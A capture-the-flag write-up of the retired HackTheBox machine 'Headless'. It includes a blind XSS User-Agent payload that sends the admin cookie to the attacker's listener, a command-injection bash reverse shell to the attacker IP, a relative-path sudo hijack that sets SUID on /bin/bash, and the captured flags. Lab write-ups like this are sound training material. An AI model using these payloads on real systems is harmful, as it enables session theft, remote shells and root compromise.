# Headless — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Headless |
| OS | Linux (Debian 12) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.78.186` |
| Tools Used | Nmap, Gobuster, curl, Python HTTP server, nc |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — Blind XSS via User-Agent → Admin Cookie → Command Injection](#foothold--blind-xss-via-user-agent--admin-cookie--command-injection)
- [Privilege Escalation — sudo syscheck Relative Path Hijack](#privilege-escalation--sudo-syscheck-relative-path-hijack)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap full TCP scan + targeted service scan | Ports 22 (SSH) and 5000 (Werkzeug/Python HTTP) open |
| 2 | Gobuster endpoint discovery | `/support` (200) and `/dashboard` (500) discovered |
| 3 | XSS payload in `message` field on `/support` | Triggers "Hacking Attempt Detected" security report — reveals admin review workflow |
| 4 | Unique value in `User-Agent` header | Reflected verbatim in the security report HTML — confirms header injection surface |
| 5 | Blind XSS payload in `User-Agent` | Admin's browser executes attacker JavaScript — `is_admin` cookie exfiltrated |
| 6 | Admin cookie used to access `/dashboard` | Authenticated as administrator — report generation functionality exposed |
| 7 | OS command injection via `date` POST parameter | `;bash -c 'bash -i >& /dev/tcp/10.10.16.36/1234 0>&1'` — reverse shell as `dvir` |
| 8 | `sudo -l` → `(ALL) NOPASSWD: /usr/bin/syscheck` | syscheck script reads `./initdb.sh` using a relative path |
| 9 | Malicious `initdb.sh` planted in `/tmp` | `chmod u+s /bin/bash` written and made executable |
| 10 | `sudo /usr/bin/syscheck` executed from `/tmp` | syscheck runs as root, calls `./initdb.sh` → SUID set on `/bin/bash` |
| 11 | `/bin/bash -p` | `euid=0(root)` — root shell |

---

## Reconnaissance

### Nmap — Phase 1: Full TCP Port Sweep

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -p- --open -T4 10.129.78.186
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

### Nmap — Phase 2: Targeted Service and Version Scan

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -sS -sV -sC -p 22,5000 -T4 10.129.78.186
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Under Construction
```

### Gobuster — Endpoint Discovery

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir -u http://10.129.78.186:5000/ -w /home/kali/HackTheBox/HackTheBox_Room/headless/wordlist -x .php,.txt,.html -t 30
```

```
/support    (Status: 200)
/dashboard  (Status: 500)
```

---

## Foothold — Blind XSS via User-Agent → Admin Cookie → Command Injection

### Step 1 — Discover the Security Report Workflow

Placing `<script>alert(1)</script>` in the `message` field returns:

```
Hacking Attempt Detected
Your IP address has been flagged. A report with your browser information has been sent to the administrators.
```

The report includes full HTTP headers — `User-Agent` is reflected verbatim into the report HTML.

### Step 2 — Deliver Blind XSS via User-Agent

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

```http
POST /support HTTP/1.1
User-Agent: <script>var i=new Image();i.src="http://10.10.16.36:8000/?cookie="+document.cookie;</script>

fname=test&lname=test&email=test@test.com&phone=1234&message=<script>alert(1)</script>
```

Admin cookie received:

```
10.129.78.186 - - [GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0]
```

### Step 3 — Access /dashboard and OS Command Injection

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 1234
```

```http
POST /dashboard HTTP/1.1
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

date=2023-09-15;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.36/1234+0>%261'
```

```
dvir@headless:~/app$
```

### Step 4 — User Flag

```bash
dvir@headless:~$ cat user.txt
9555cfc3b64ffef053cfff5ba8cf801c
```

---

## Privilege Escalation — sudo syscheck Relative Path Hijack

```bash
dvir@headless:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/syscheck

dvir@headless:~$ cat /usr/bin/syscheck
```

Critical line:

```bash
./initdb.sh 2>/dev/null
```

Relative path — resolves from current working directory.

```bash
dvir@headless:~$ cd /tmp
dvir@headless:/tmp$ echo 'chmod u+s /bin/bash' > initdb.sh
dvir@headless:/tmp$ chmod +x initdb.sh
dvir@headless:/tmp$ sudo /usr/bin/syscheck
```

```
Database service is not running. Starting it...
```

```bash
dvir@headless:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23 2023 /bin/bash

dvir@headless:/tmp$ /bin/bash -p
bash-5.2# id
uid=1000(dvir) gid=1000(dvir) euid=0(root)
```

### Root Flag

```bash
bash-5.2# cat /root/root.txt
bdca4ea722b9346623a0f0c6aac936e6
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `9555cfc3b64ffef053cfff5ba8cf801c` |
| Root Flag | `bdca4ea722b9346623a0f0c6aac936e6` |

---

## Lessons Learned

1. When an application says a report was sent to an administrator, that report is a blind XSS surface — any user-controlled data rendered in the admin's browser can execute JavaScript.
2. HTTP headers are attacker-controlled input. `User-Agent`, `Referer`, and `X-Forwarded-For` must be treated like form fields.
3. A `500` from content discovery is a lead — it marks a route that exists but requires something you don't have yet.
4. Relative paths in privileged scripts are exploitable if the caller controls the working directory. `sudo` inherits the caller's CWD.

---

## Full Attack Chain Reference

```
Nmap → ports 22, 5000 (Werkzeug/Flask)
Gobuster → /support (200), /dashboard (500)
/support message=<script>alert(1)</script> → "Hacking Attempt Detected"
User-Agent reflected in admin report HTML
python3 -m http.server 8000
User-Agent: <script>var i=new Image();i.src="http://10.10.16.36:8000/?cookie="+document.cookie;</script>
  → is_admin=ImFkbWluIg... cookie stolen
curl -b 'is_admin=...' /dashboard → 200 admin panel
nc -lvnp 1234
POST /dashboard date=2023-09-15;bash -c 'bash -i >& /dev/tcp/10.10.16.36/1234 0>&1'
  → dvir@headless shell
cat ~/user.txt: 9555cfc3b64ffef053cfff5ba8cf801c
sudo -l → (ALL) NOPASSWD: /usr/bin/syscheck
cat /usr/bin/syscheck → ./initdb.sh (relative path)
cd /tmp && echo 'chmod u+s /bin/bash' > initdb.sh && chmod +x initdb.sh
sudo /usr/bin/syscheck → SUID set on /bin/bash
/bin/bash -p → euid=0(root)
cat /root/root.txt: bdca4ea722b9346623a0f0c6aac936e6
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -Pn -p- --open -T4 <IP>` | Full TCP port sweep |
| `sudo nmap -Pn -sS -sV -sC -p 22,5000 -T4 <IP>` | Targeted version scan |
| `gobuster dir -u http://<IP>:5000/ -w <wordlist>` | Endpoint discovery |
| `python3 -m http.server 8000` | Cookie exfiltration listener |
| Blind XSS via User-Agent | Steal `is_admin` cookie |
| `nc -lvnp 1234` | Reverse shell listener |
| POST `/dashboard` with command injection in `date` | OS command injection |
| `sudo -l` | Check sudo permissions |
| `cd /tmp && echo 'chmod u+s /bin/bash' > initdb.sh` | Plant malicious initdb.sh |
| `sudo /usr/bin/syscheck` from `/tmp` | Trigger SUID exploit |
| `/bin/bash -p` | Root shell via SUID bash |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1595 | T1595.001 | Nmap full TCP sweep + targeted service scan |
| T1059 | T1059.007 — JavaScript | Blind XSS via User-Agent — JS in admin browser |
| T1539 | — | `document.cookie` exfiltration via Image beacon |
| T1550 | T1550.004 — Web Session Cookie | Stolen `is_admin` cookie replayed to authenticate |
| T1190 | — | OS command injection in `date` POST parameter |
| T1059 | T1059.004 — Unix Shell | Bash reverse shell via command injection |
| T1548 | T1548.003 — Sudo | `dvir` NOPASSWD: /usr/bin/syscheck |
| T1574 | T1574.005 | `./initdb.sh` relative path hijack via /tmp |
| T1548 | T1548.001 — Setuid | `chmod u+s /bin/bash`; `bash -p` root |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
